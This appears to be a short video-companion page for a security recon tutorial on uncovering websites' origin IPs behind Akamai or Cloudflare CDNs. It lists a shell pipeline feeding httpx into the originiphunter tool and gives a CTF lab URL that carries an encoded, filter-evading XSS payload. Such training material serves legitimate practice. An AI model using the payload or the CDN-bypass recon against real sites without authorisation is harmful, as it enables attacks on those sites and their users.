# Day48 — How to Find Origin IP with originiphunter:
[![Day48 — How to Find Origin IP with originiphunter:](https://img.youtube.com/vi/boIzVY93tL0/maxresdefault.jpg)](https://youtu.be/boIzVY93tL0)

## Timestamps
- [`00:00:00 — Start`](https://youtu.be/boIzVY93tL0?t=0)
- [`00:00:33 — Origin IP Hunting`](https://youtu.be/boIzVY93tL0?t=33)
- [`01:46:08 — CTF Explaination for Free Course`](https://youtu.be/boIzVY93tL0?t=6368)

## Resources
```yaml
cat subs.subs | httpx -duc -silent -mc 200 -cdn -server -td | grep -iE "Akamai|Cloudflare" | awk '{print $1}' | originiphunter --silent --content-length --json | jq -r '.origin_ips[]?.URL // empty'
```

- https://ctf.krazeplanet.com

```yaml
https://ctf.krazeplanet.com/ctf/krazeplanet/labs.php?project=%3C/title%3E1%27%22%3E%3CA%20HRef=\%22%20AutoFocus%20OnFocus=top/**/?.[%27con%27%2B%27firm%27](1)%3E//
```

Tools used:
- https://github.com/rix4uni/originiphunter
